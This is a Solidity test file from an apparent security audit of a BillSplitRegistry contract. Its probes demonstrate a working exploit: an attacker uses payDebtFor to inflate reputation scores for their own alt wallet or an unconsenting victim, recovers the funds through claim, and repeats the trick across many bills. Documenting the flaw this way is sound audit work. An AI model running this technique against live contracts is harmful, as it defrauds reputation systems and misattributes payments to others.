// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

import {BillSplitRegistry} from "./BillSplitRegistry.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";
import {Test} from "./test/Test.sol";

contract AuditProbeTest is Test {
  MockUSDC private usdc;
  BillSplitRegistry private registry;
  address private attacker = address(0xA77ACC);
  address private alt = address(0xA17);      // attacker's own second wallet
  address private victim = address(0x1C71);

  event DebtPaid(uint256 indexed billId, address indexed payer, uint256 amount, uint256 paidTotal, uint256 owedTotal);

  function setUp() public {
    usdc = new MockUSDC();
    registry = new BillSplitRegistry(address(usdc));
    usdc.mint(attacker, 1_000e6);
    vm.prank(attacker);
    usdc.approve(address(registry), type(uint256).max);
  }

  function _one(address who, uint256 amt)
    private pure returns (address[] memory a, uint256[] memory b) {
    a = new address[](1); a[0] = who;
    b = new uint256[](1); b[0] = amt;
  }

  /// PROBE D — the headline. An attacker names their OWN alt wallet as the sole
  /// debtor, then funds that debt themselves via payDebtFor. The registry emits
  /// DebtPaid with payer = alt (NOT the funder) and paidTotal >= owedTotal, which
  /// is exactly the (paidInFull) shape lib/erc8004.ts scores as positive
  /// reputation for `alt`. Cost: 1 base unit of USDC, round-tripped back via claim.
  function testProbeScoreFarmingViaPayDebtFor() public {
    (address[] memory p, uint256[] memory a) = _one(alt, 1);
    vm.prank(attacker);
    uint256 id = registry.createBill(bytes32("farm"), p, a, 0, false);

    // The event the reputation webhook consumes names `alt` as the payer even
    // though `alt` never signed anything and holds no USDC at all.
    vm.expectEmit(true, true, false, true, address(registry));
    emit DebtPaid(id, alt, 1, 1, 1); // paidTotal == owedTotal => paidInFull

    vm.prank(attacker);
    registry.payDebtFor(id, alt, 1);

    assertEq(usdc.balanceOf(alt), 0, "alt never held or spent a cent");

    // The attacker takes the money straight back out as the bill's splitter.
    uint256 before = usdc.balanceOf(attacker);
    vm.prank(attacker);
    registry.claim(id, 1);
    assertEq(usdc.balanceOf(attacker), before + 1, "funds round-trip: net cost is gas only");
  }

  /// PROBE E: the same trick against a VICTIM who never consented. Positive-only
  /// scoring makes this a forced gift rather than griefing, but it still writes
  /// unconsented on-chain history for someone else's wallet.
  function testProbeUnconsentedScoreForVictim() public {
    (address[] memory p, uint256[] memory a) = _one(victim, 1);
    vm.prank(attacker);
    uint256 id = registry.createBill(bytes32("gift"), p, a, 0, false);

    vm.expectEmit(true, true, false, true, address(registry));
    emit DebtPaid(id, victim, 1, 1, 1);

    vm.prank(attacker);
    registry.payDebtFor(id, victim, 1);

    assertEq(usdc.balanceOf(victim), 0, "victim never paid, yet is named the payer");
  }

  /// PROBE F: repeatable — each fresh bill is an independent scoreable event, so
  /// the farm is unbounded in count, not a one-off.
  function testProbeFarmingRepeatsAcrossBills() public {
    for (uint256 i = 0; i < 5; ++i) {
      (address[] memory p, uint256[] memory a) = _one(alt, 1);
      vm.prank(attacker);
      uint256 id = registry.createBill(bytes32("farm"), p, a, 0, false);
      vm.prank(attacker);
      registry.payDebtFor(id, alt, 1);
      vm.prank(attacker);
      registry.claim(id, 1);
    }
    assertEq(registry.billIdsForParticipant(alt).length, 5, "5 independent paid-in-full events");
  }
}
